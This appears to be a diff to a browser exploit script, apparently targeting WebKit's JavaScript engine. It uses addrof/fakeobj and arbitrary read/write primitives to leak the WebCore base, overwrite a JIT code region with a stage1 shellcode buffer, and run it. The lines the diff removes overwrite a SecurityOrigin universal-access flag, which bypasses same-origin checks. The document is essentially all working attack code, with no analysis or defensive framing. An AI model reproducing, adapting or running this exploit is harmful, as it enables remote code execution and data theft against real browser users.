@@ -274,7 +274,7 @@ function pwn() {
 
     // build fake driver
     var containerAddr = addrofOnce2(container);
-    var fakeArrAddr = Add(containerAddr, 0x10); // 16//containerAddr + 0x10;
+    var fakeArrAddr = Add(containerAddr, 0x10);
     var driver = fakeobjOnce2(fakeArrAddr);
 
     // ArrayWithDouble
@@ -345,87 +345,68 @@ function pwn() {
         }
     }
 
-    const toHex = (num, padding = 0, uppercase = false) => 
-        `0x${num.toString(16).padStart(padding, '0')}${uppercase ? '' : ''}`.toUpperCase();
-
-    //let the fun begin!
     let myOBJ = {a: 0x1337};
     let myOBJAddr = addrof(myOBJ);
-    log(`[*] myOBJAddr = ${(myOBJAddr).toString(16)}`); 
+    log(`[*] myOBJAddr = ${(myOBJAddr).toString(16)}`);
 
     let fakeOBJ = fakeobj(myOBJAddr);
-    log(`[*] fakeOBJ = ${(fakeOBJ.a).toString(16)}`); 
+    log(`[*] fakeOBJ = ${(fakeOBJ.a).toString(16)}`);
 
     let myOBJ2 = {b: 0x4141};
     let myOBJAddr2 = addrof(myOBJ2);
-    log(`[*] myOBJAddr2 = ${(myOBJAddr2).toString(16)}`); 
+    log(`[*] myOBJAddr2 = ${(myOBJAddr2).toString(16)}`);
 
     let fakeOBJ2 = fakeobj(myOBJAddr2);
-    log(`[*] fakeOBJ2 = ${(fakeOBJ2.b).toString(16)}`); 
- 
-    var spectre = (typeof SharedArrayBuffer !== 'undefined'); 
-    var FPO = spectre ? 0x18 : 0x10; 
-    log(`[*] FPO = ${FPO.toString(16)}`);
-    
+    log(`[*] fakeOBJ2 = ${(fakeOBJ2.b).toString(16)}`);
+
+    var spectre = (typeof SharedArrayBuffer !== 'undefined');
+    var FPO = spectre ? 0x18 : 0x10;
+    log(`[*] FPO: ${FPO.toString(16)}`);
+
     var wrapper = document.createElement('div');
     var wrapper_addr = addrof(wrapper);
-    log(`[*] wrapper_addr = ${(wrapper_addr).toString(16)}`); 
+    log(`[*] wrapper_addr = ${(wrapper_addr).toString(16)}`);
     var el_addr = read64(wrapper_addr + FPO);
-    log(`[*] el_addr = ${(el_addr).toString(16)}`); 
+    log(`[*] el_addr = ${(el_addr).toString(16)}`);
     var vtab_addr = read64(el_addr);
-    log(`[*] vtab_addr = ${(vtab_addr).toString(16)}`); 
-
-    //macOS 13.0.1 (x86_64)
-    var JSXMLHttpRequest = new XMLHttpRequest();
-    var JSXMLHttpRequest_ptr = addrof(JSXMLHttpRequest);
-    log("[*] JSXMLHttpRequest @ " + JSXMLHttpRequest_ptr.toString(16));
-
-    var XMLHttpRequest_ptr = read64(JSXMLHttpRequest_ptr + 0x18) - 0x28;
-    log("[*] XMLHttpRequest @ " + XMLHttpRequest_ptr.toString(16));
-
-    var ScriptExecutionContext_ptr = read64(XMLHttpRequest_ptr + 0x8);
-    log("[*] ScriptExecutionContext @ " + ScriptExecutionContext_ptr.toString(16));
-
-    var SecurityOriginPolicy_ptr = read64(ScriptExecutionContext_ptr + 0x8);
-    log("[*] SecurityOriginPolicy @ " + SecurityOriginPolicy_ptr.toString(16));
-
-    var SecurityOrigin_ptr = read64(SecurityOriginPolicy_ptr + 0x8);
-    log("[*] SecurityOrigin @ " + SecurityOrigin_ptr.toString(16));
-
-    var SecurityOrigin_flags = read64(SecurityOrigin_ptr + 0x40);
-    log(`[*] SecurityOrigin->m_universalAccess @ ${SecurityOrigin_flags.toString(16)}`);
-
-    var new_flags = SecurityOrigin_flags + 1;
-    write64(SecurityOrigin_ptr + 0x40, new_flags);
-    var SecurityOrigin_flags2 = read64(SecurityOrigin_ptr + 0x40);
-    log(`[*] Modified SecurityOrigin->m_universalAccess @ ${SecurityOrigin_flags2.toString(16)}`);
-
-
-    
-    var webcore_base = vtab_addr - 0x250c87d;
-    log(`[*] webcore base @ ${(webcore_base).toString(16)}`); 
-    var read_webcore = read64(webcore_base);
-    log(`[*] webcore read test @ ${read_webcore.toString(16)}`);
+    log(`[*] vtab_addr = ${(vtab_addr).toString(16)}`);
 
     var shellcodeFuncAddr = addrof(shellcodeFunc);
-    log(`[*] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);
+    log(`[+] Shellcode function @ ${shellcodeFuncAddr.toString(16)}`);
 
     var executableAddr = read64(shellcodeFuncAddr + 24);
-    log(`[*] Executable instance @ ${executableAddr.toString(16)}`);
+    log(`[+] Executable instance @ ${executableAddr.toString(16)}`);
 
     var jitCodeAddr = read64(executableAddr + 8);
-    log(`[*] JITCode instance @ ${jitCodeAddr.toString(16)}`);
+    log(`[+] JITCode instance @ ${jitCodeAddr.toString(16)}`);
 
-    var JITCode = read64(jitCodeAddr + 0x1a0);
-    log(`[*] JITCode @ ${JITCode.toString(16)}`);
+    var JITCode = read64(jitCodeAddr + 0x1a8);
+    log(`[+] JITCode @ ${JITCode.toString(16)}`);
 
-    stage1.replace(new Int64("0x4141414141414141"), new Int64(webcore_base));
+    var webcore_base = vtab_addr - (0x1921f45c6 - 0x190045000);
+    log(`[+] webcore base = ${(webcore_base).toString(16)}`);
+    var read_webcore = read64(webcore_base);
+    log(`[i] webcore read test = ${read_webcore.toString(16)}`);
+
+    let hexdump = function(buf) {
+        let arr = new Uint8Array(buf);
+        let str = "";
+        for (let i = 0; i < arr.length; i++) {
+            str += arr[i].toString(16) + " ";
+        }
+        return str;
+    }
+
+    log(`[*] hexdump(stage1): ${hexdump(stage1)}`);
+
+    stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(webcore_base));
+    log(`[*] hexdump(stage1): ${hexdump(stage1)}`);
 
     ArbitraryWrite(JITCode, stage1);
 
-    log('[*] Executed stage1.bin!');
+    log(`[*] Executing stage1`);
 
     shellcodeFunc();
 
-    log("[*] Done!");
+    log(`[*] Stage1 returned`);
 }
